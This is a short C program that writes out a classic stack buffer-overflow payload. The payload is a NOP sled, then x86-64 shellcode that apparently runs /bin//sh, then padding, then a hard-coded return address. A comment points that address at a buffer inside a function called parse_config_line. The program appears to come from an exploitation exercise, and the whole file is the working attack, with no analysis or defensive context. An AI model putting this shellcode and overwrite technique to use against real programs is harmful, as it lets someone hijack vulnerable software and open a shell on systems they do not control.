#include <stdio.h>
#include <string.h>

char code[] = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";

void main()
{
    int i, j;
    for (i = 0; i < 990; i++)
	    printf("\x90");
    printf("%s\\\n", code);  
    i += strlen(code) + 1;
    for (; i < 1064; i++)
	    printf("\x90");
    printf("\x10\xd8\xff\xff\xff\x7f"); // &buf@parse_config_line = 0x7fffffffd7e0
}
